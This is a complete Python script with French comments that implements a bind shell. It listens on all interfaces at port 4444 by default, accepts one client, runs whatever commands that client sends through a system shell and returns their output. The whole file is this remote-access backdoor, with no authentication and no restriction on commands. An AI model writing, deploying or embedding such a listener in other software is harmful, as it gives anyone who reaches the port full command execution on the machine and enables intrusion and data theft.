import socket
import subprocess
import click

# Fonction pour exécuter une commande et renvoyer sa sortie
def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

# Options de ligne de commande avec Click pour spécifier le port
@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    # Créer un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Lier le socket à une adresse et un port spécifiques
    s.bind(('0.0.0.0', port))
    
    # Écouter les connexions entrantes, avec une file d'attente maximale de 4
    s.listen(4)
    
    # Accepter une connexion d'un client
    client_socket, address = s.accept()

    # Recevoir et traiter continuellement les commandes du client
    while True:
        # Initialiser une liste vide pour stocker les morceaux de données reçus
        chunks = []
        
        # Recevoir le premier morceau de données (jusqu'à 2048 octets)
        chunk = client_socket.recv(2048)
        
        # Ajouter le morceau à la liste des morceaux
        chunks.append(chunk)
        
        # Continuer à recevoir des morceaux jusqu'à ce qu'un caractère de nouvelle ligne soit rencontré
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        
        # Combinez les morceaux reçus en une seule chaîne et supprimez le saut de ligne final
        cmd = (b''.join(chunks)).decode()[:-1]

        # Vérifier si la commande reçue est 'exit'; si c'est le cas, fermer la connexion et sortir de la boucle
        if cmd.lower() == 'exit':
            client_socket.close()
            break

        # Exécuter la commande reçue et obtenir la sortie
        output = run_cmd(cmd)
        
        # Envoyer la sortie de la commande de retour au client
        client_socket.sendall(output)

# Exécuter la fonction principale si le script est exécuté directement
if __name__ == '__main__':
    main()
